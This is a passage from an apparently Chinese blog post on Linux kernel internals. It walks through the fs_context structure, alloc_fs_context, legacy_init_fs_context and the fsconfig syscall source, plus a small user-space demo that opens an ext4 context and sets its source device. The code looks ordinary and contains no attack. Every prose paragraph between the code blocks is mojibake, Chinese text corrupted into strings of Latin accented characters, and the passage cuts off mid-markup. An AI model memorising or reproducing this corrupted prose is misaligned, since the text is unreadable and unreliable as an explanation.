class="keyword">enum</span> <span class="title">fs_context_phase</span>	<span class="title">phase</span>:</span><span class="number">8</span>;	<span class="comment">/* The phase the context is in */</span></span><br><span class="line">	<span class="keyword">bool</span>			need_free:<span class="number">1</span>;	<span class="comment">/* Need to call ops-&gt;free() */</span></span><br><span class="line">	<span class="keyword">bool</span>			global:<span class="number">1</span>;	<span class="comment">/* Goes into &amp;init_user_ns */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢æ˜¯<code>fs_context</code>ç»“æ„ä½“çš„å®šä¹‰ï¼Œå‰é¢æåˆ°å…¶æ˜¯é€šè¿‡<code>fs_context_for_mount</code>å‡½æ•°ç”³è¯·çš„ï¼Œè¿™ä¸ªå‡½æ•°å†…éƒ¨æ˜¯ç›´æ¥è°ƒç”¨äº†<code>alloc_fs_context</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * alloc_fs_context - Create a filesystem context.</span></span><br><span class="line"><span class="comment"> * @fs_type: The filesystem type.</span></span><br><span class="line"><span class="comment"> * @reference: The dentry from which this one derives (or NULL)</span></span><br><span class="line"><span class="comment"> * @sb_flags: Filesystem/superblock flags (SB_*)</span></span><br><span class="line"><span class="comment"> * @sb_flags_mask: Applicable members of @sb_flags</span></span><br><span class="line"><span class="comment"> * @purpose: The purpose that this configuration shall be used for.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Open a filesystem and create a mount context.  The mount context is</span></span><br><span class="line"><span class="comment"> * initialised with the supplied flags and, if a submount/automount from</span></span><br><span class="line"><span class="comment"> * another superblock (referred to by @reference) is supplied, may have</span></span><br><span class="line"><span class="comment"> * parameters such as namespaces copied across from that superblock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct fs_context *<span class="title">alloc_fs_context</span><span class="params">(struct file_system_type *fs_type,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct dentry *reference,</span></span></span><br><span class="line"><span class="params"><span class="function">				      <span class="keyword">unsigned</span> <span class="keyword">int</span> sb_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">				      <span class="keyword">unsigned</span> <span class="keyword">int</span> sb_flags_mask,</span></span></span><br><span class="line"><span class="params"><span class="function">				      <span class="keyword">enum</span> fs_context_purpose purpose)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> (*init_fs_context)(struct fs_context *);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret = -ENOMEM;</span><br><span class="line"></span><br><span class="line">	fc = kzalloc(<span class="keyword">sizeof</span>(struct fs_context), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!fc)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	fc-&gt;purpose	= purpose;</span><br><span class="line">	fc-&gt;sb_flags	= sb_flags;</span><br><span class="line">	fc-&gt;sb_flags_mask = sb_flags_mask;</span><br><span class="line">	fc-&gt;fs_type	= get_filesystem(fs_type);</span><br><span class="line">	fc-&gt;cred	= get_current_cred();</span><br><span class="line">	fc-&gt;net_ns	= get_net(current-&gt;nsproxy-&gt;net_ns);</span><br><span class="line"></span><br><span class="line">	mutex_init(&amp;fc-&gt;uapi_mutex);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (purpose) &#123;</span><br><span class="line">	<span class="keyword">case</span> FS_CONTEXT_FOR_MOUNT:</span><br><span class="line">		fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:</span><br><span class="line">		fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:</span><br><span class="line">		atomic_inc(&amp;reference-&gt;d_sb-&gt;s_active);</span><br><span class="line">		fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);</span><br><span class="line">		fc-&gt;root = dget(reference);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> Make all filesystems support this unconditionally */</span></span><br><span class="line">	init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;</span><br><span class="line">	<span class="keyword">if</span> (!init_fs_context)</span><br><span class="line">		init_fs_context = legacy_init_fs_context;</span><br><span class="line"></span><br><span class="line">	ret = init_fs_context(fc);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_fc;</span><br><span class="line">	fc-&gt;need_free = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> fc;</span><br><span class="line"></span><br><span class="line">err_fc:</span><br><span class="line">	put_fs_context(fc);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè¿™é‡Œé€šè¿‡<code>kzalloc</code>å‡½æ•°åˆ†é…ä¸€ä¸ªå †å—ç»™åˆ°äº†<code>fs_context</code>ç»“æ„ä½“ï¼Œåç»­è®¾ç½®å…¶å¯¹åº”çš„å±æ€§ï¼Œæ¥ç€è®¾ç½®å…¶å‘½åç©ºé—´ï¼Œæœ€ååˆ™æ˜¯è¿›è¡Œåˆå§‹åŒ–ã€‚</p>
<p>åœ¨å®Œæˆäº†å‰é¢çš„æ“ä½œä¹‹åï¼Œæœ€ç»ˆè¿›è¡Œå…·ä½“æ–‡ä»¶ç³»ç»Ÿå¯¹åº”åˆå§‹åŒ–å·¥ä½œçš„å…¶å®æ˜¯è°ƒç”¨ <code>file_system_type</code> ä¸­çš„ <code>init_fs_context</code> å‡½æ•°æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°å®Œæˆçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹äºæœªè®¾ç½® <code>init_fs_context</code> çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹è€Œè¨€å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>legacy_init_fs_context()</code> è¿›è¡Œåˆå§‹åŒ–</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_init_fs_context</span><span class="params">(struct fs_context *fc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	fc-&gt;fs_private = kzalloc(<span class="keyword">sizeof</span>(struct legacy_fs_context), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!fc-&gt;fs_private)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	fc-&gt;ops = &amp;legacy_fs_context_ops;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„ä¸»è¦æ“ä½œæ˜¯ç»™<code>fs_context-&gt;fs_private</code>åˆ†é…<code>legacy_fs_context</code>ç»“æ„ä½“ï¼Œå¹¶èµ‹å€¼å…¶opsä¸º<code>legacy_fs_context_ops</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">legacy_fs_context</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span>			*legacy_data;	<span class="comment">/* Data page for legacy filesystems */</span></span><br><span class="line">	<span class="keyword">size_t</span>			data_size;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">legacy_fs_param</span>	<span class="title">param_type</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç»“æ„ä½“å®šä¹‰å¦‚ä¸Šï¼Œæ ‡è¯†äº†ä¸€å—æŒ‡å®šé•¿åº¦ä¸ç±»å‹çš„ç¼“å†²åŒºã€‚</p>
<h3 id="fsconfig"><a href="#fsconfig" class="headerlink" title="fsconfig"></a>fsconfig</h3><p>åœ¨å®Œæˆäº†ç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹å…¶è¿›è¡Œç›¸åº”çš„é…ç½®ï¼Œä»¥ä¾¿äºåç»­çš„æŒ‚è½½æ“ä½œï¼Œè¿™ä¸ªé…ç½®çš„åŠŸèƒ½å¯¹åº”åˆ°çš„å°±æ˜¯ <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨æ ¹æ®ä¸åŒçš„ cmd è¿›è¡Œä¸åŒçš„æ“ä½œï¼Œå¯¹äºæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿè€Œè¨€å…¶æ ¸å¿ƒæ“ä½œä¸»è¦å°±æ˜¯ä¸¤ä¸ª cmdï¼š</p>
<ul>
<li><code>FSCONFIG_SET_STRING</code> ï¼šè®¾ç½®ä¸åŒçš„é”®å€¼å¯¹å‚æ•°</li>
<li><code>FSCONFIG_CMD_CREATE</code>ï¼šè·å¾—ä¸€ä¸ª superblock å¹¶åˆ›å»ºä¸€ä¸ª root entry</li>
</ul>
<p>ç¤ºä¾‹ç”¨æ³•å¦‚ä¸Šæ‰€ç¤ºï¼Œè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªé”®å€¼å¯¹ <code>&quot;source&quot;=/dev/sdb1</code> è¡¨ç¤ºæ–‡ä»¶ç³»ç»Ÿæºæ‰€åœ¨çš„è®¾å¤‡å</p>
<p>åœ¨å†…æ ¸ä¸­ä¹Ÿæ˜¯<code>fsconfig</code>çš„å®ç°ä¹Ÿæ˜¯æ¯”è¾ƒé•¿ï¼Œä¸»è¦æ ¹æ®ä¸åŒçš„cmdè¿›å…¥åˆ°ä¸åŒçš„swithåˆ†æ”¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(fsconfig,</span><br><span class="line">		<span class="keyword">int</span>, fd,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span>, cmd,</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">char</span> __user *, _key,</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">void</span> __user *, _value,</span><br><span class="line">		<span class="keyword">int</span>, aux)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter</span> <span class="title">param</span> =</span> &#123;</span><br><span class="line">		.type	= fs_value_is_undefined,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line">		<span class="keyword">if</span> (!_key || _value || aux)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">		<span class="keyword">if</span> (!_key || !_value || aux)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">		<span class="keyword">if</span> (!_key || !_value || aux &lt;= <span class="number">0</span> || aux &gt; <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">		<span class="keyword">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span class="number">0</span>))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">		<span class="keyword">if</span> (!_key || _value || aux &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_CMD_CREATE:</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_CMD_RECONFIGURE:</span><br><span class="line">		<span class="keyword">if</span> (_key || _value || aux)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	f = fdget(fd);</span><br><span class="line">	<span class="keyword">if</span> (!f.file)</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line">	ret = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)</span><br><span class="line">		<span class="keyword">goto</span> out_f;</span><br><span class="line"></span><br><span class="line">	fc = f.file-&gt;private_data;</span><br><span class="line">	<span class="keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;</span><br><span class="line">		<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">		<span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">		<span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">		<span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">		<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">			ret = -EOPNOTSUPP;</span><br><span class="line">			<span class="keyword">goto</span> out_f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (_key) &#123;</span><br><span class="line">		param.key = strndup_user(_key, <span class="number">256</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.key)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.key);</span><br><span class="line">			<span class="keyword">goto</span> out_f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line">		param.type = fs_value_is_flag;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">		param.type = fs_value_is_string;</span><br><span class="line">		param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.<span class="built_in">string</span>)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.<span class="built_in">string</span>);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		param.size = <span class="built_in">strlen</span>(param.<span class="built_in">string</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">		param.type = fs_value_is_blob;</span><br><span class="line">		param.size = aux;</span><br><span class="line">		param.blob = memdup_user_nul(_value, aux);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.blob)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.blob);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">		param.type = fs_value_is_filename;</span><br><span class="line">		param.name = getname_flags(_value, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.name)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.name);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		param.dirfd = aux;</span><br><span class="line">		param.size = <span class="built_in">strlen</span>(param.name-&gt;name);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">		param.type = fs_value_is_filename_empty;</span><br><span class="line">		param.name = getname_flags(_value, LOOKUP_EMPTY, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.name)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.name);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		param.dirfd = aux;</span><br><span class="line">		param.size = <span class="built_in">strlen</span>(param.name-&gt;name);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">		param.type = fs_value_is_file;</span><br><span class="line">		ret = -EBADF;</span><br><span class="line">		param.file = fget(aux);</span><br><span class="line">		<span class="keyword">if</span> (!param.file)</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">		ret = vfs_fsconfig_locked(fc, cmd, &amp;param);</span><br><span class="line">		mutex_unlock(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Clean up the our record of any value that we obtained from</span></span><br><span class="line"><span class="comment">	 * userspace.  Note that the value may have been stolen by the LSM or</span></span><br><span class="line"><span class="comment">	 * filesystem, in which case the value pointer will have been cleared.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">		kfree(param.<span class="built_in">string</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">		<span class="keyword">if</span> (param.name)</span><br><span class="line">			putname(param.name);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">		<span class="keyword">if</span> (param.file)</span><br><span class="line">			fput(param.file);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">out_key:</span><br><span class="line">	kfree(param.key);</span><br><span class="line">out_f:</span><br><span class="line">	fdput(f);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span 